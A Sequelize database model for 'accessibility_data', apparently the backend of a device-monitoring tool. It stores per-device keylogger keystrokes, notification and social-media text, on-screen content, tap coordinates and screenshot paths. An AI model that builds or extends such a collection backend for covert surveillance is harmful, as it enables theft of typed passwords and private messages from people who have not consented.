const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {
  const AccessibilityData = sequelize.define('AccessibilityData', {
    id: {
      type: DataTypes.UUID,
      defaultValue: DataTypes.UUIDV4,
      primaryKey: true
    },

    deviceId: {
      type: DataTypes.STRING,
      allowNull: false,
      field: 'device_id',
      references: {
        model: 'devices',
        key: 'device_id'
      },
      onUpdate: 'CASCADE',
      onDelete: 'CASCADE'
    },

    dataType: {
      type: DataTypes.ENUM('keylogger', 'notifications', 'social_media', 'screen_content', 'ui_events'),
      field: 'data_type',
      allowNull: false
    },

    appPackage: {
      type: DataTypes.STRING,
      field: 'app_package'
    },

    appName: {
      type: DataTypes.STRING,
      field: 'app_name'
    },

    eventType: {
      type: DataTypes.STRING,
      field: 'event_type'
    },

    contentText: {
      type: DataTypes.TEXT,
      field: 'content_text'
    },

    contentDescription: {
      type: DataTypes.TEXT,
      field: 'content_description'
    },

    className: {
      type: DataTypes.STRING,
      field: 'class_name'
    },

    viewId: {
      type: DataTypes.STRING,
      field: 'view_id'
    },

    windowTitle: {
      type: DataTypes.STRING,
      field: 'window_title'
    },

    notificationTitle: {
      type: DataTypes.STRING,
      field: 'notification_title'
    },

    notificationText: {
      type: DataTypes.TEXT,
      field: 'notification_text'
    },

    notificationKey: {
      type: DataTypes.STRING,
      field: 'notification_key'
    },

    keystrokes: {
      type: DataTypes.TEXT
    },

    coordinates: {
      type: DataTypes.JSON
    },

    screenshotPath: {
      type: DataTypes.STRING,
      field: 'screenshot_path'
    },

    metadata: {
      type: DataTypes.JSON
    },

    timestamp: {
      type: DataTypes.DATE,
      defaultValue: DataTypes.NOW
    },

    isSensitive: {
      type: DataTypes.BOOLEAN,
      field: 'is_sensitive',
      defaultValue: false
    },

    isDeleted: {
      type: DataTypes.BOOLEAN,
      field: 'is_deleted',
      defaultValue: false
    }

  }, {
    tableName: 'accessibility_data',
    timestamps: true,
    underscored: true,
    indexes: [
      { fields: ['device_id'] },
      { fields: ['data_type'] },
      { fields: ['created_at'] }
    ]
  });

  AccessibilityData.associate = (models) => {
    AccessibilityData.belongsTo(models.Device, {
      foreignKey: 'deviceId',
      targetKey: 'deviceId',
      as: 'device'
    });
  };

  return AccessibilityData;
};